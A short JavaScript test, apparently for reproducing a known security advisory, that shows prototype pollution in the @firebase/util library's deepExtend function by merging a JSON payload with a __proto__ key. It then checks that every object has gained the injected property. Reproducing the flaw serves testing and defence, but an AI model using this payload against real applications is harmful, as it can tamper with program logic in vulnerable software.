//https://security.snyk.io/vuln/SNYK-JS-FIREBASEUTIL-1038324
test("prototype pollution in @firebase/util", () => {
  expect({}.polluted).toBe(undefined);

  const util = require("@firebase/util");
  var payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');

  const a = {
    nest: {
      number: 1,
      string: "1",
      object: { key: "1" },
      date: new Date(1),
      nest: {
        a: 1,
      },
    },
  };

  var result = util.deepExtend(a, payload);
  expect({}.polluted).toBe("yes");
});
